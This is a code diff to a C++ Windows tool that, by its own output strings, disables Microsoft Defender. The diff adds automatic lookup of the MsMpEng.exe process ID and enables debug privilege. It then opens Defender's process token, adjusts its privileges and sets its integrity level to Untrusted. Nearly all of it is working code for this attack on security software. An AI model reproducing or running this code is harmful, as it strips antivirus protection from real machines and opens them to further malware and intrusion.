@@ -8,6 +8,8 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <iostream>
+#include <TlHelp32.h>
+
 #include <conio.h>
 
 
@@ -36,7 +38,29 @@ bool EnableDebugPrivilege()
     return true;
 }
 
+int getpid(LPCWSTR procname) {
 
+    DWORD procPID = 0;
+    LPCWSTR processName = L"";
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+
+    // replace this with Ntquerysystemapi
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
+    if (Process32First(snapshot, &processEntry))
+    {
+        while (_wcsicmp(processName, procname) != 0)
+        {
+            Process32Next(snapshot, &processEntry);
+            processName = processEntry.szExeFile;
+            procPID = processEntry.th32ProcessID;
+        }
+        printf("[+] Got target proc PID: %d\n", procPID);
+    }
+
+    return procPID;
+}
 
 BOOL SetPrivilege(
     HANDLE hToken,          // access token handle
@@ -88,29 +112,42 @@ BOOL SetPrivilege(
 }
 
 
-int main()
+int main(int argc, char** argv)
 {
     LUID sedebugnameValue;
     EnableDebugPrivilege();
 
+    wchar_t procname[80] = L"MsMpEng.exe";
+
+    int pid = getpid(procname);
+
+
+   // printf("PID %d\n", pid);
 	printf("[*] Killing Defender...\n");
 
     // hardcoding PID of msmpeng for now
-	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 6760);
+	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
 
 	if (phandle != INVALID_HANDLE_VALUE) {
 
 		printf("[*] Opened Target Handle\n");
 	}
+    else {
+        printf("[-] Failed to open Process Handle\n");
+    }
 
-    printf("%p\n", phandle);
+   // printf("%p\n", phandle);
   
     HANDLE ptoken;
 
    BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
 
-   printf("[*] Opened Target Token Handle");
-
+   if (token) {
+       printf("[*] Opened Target Token Handle\n");
+   }
+   else {
+       printf("[-] Failed to open Token Handle\n");
+   }
 
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
 
@@ -123,7 +160,8 @@ int main()
 
    if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
 
-       printf("Failed\n");
+       printf("[-] Failed to Adjust Token's Privileges\n");
+       return 0;
    }
 
   
@@ -165,10 +203,14 @@ int main()
        &tokenIntegrityLevel,
        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
    {
-        printf("SetTokenInformation failed\n");
-   }
+       printf("SetTokenInformation failed\n");
+   }else{
 
    printf("[*] Token Integrity set to Untrusted\n");
+   }
+
+   CloseHandle(ptoken);
+   CloseHandle(phandle);
 
 }
 
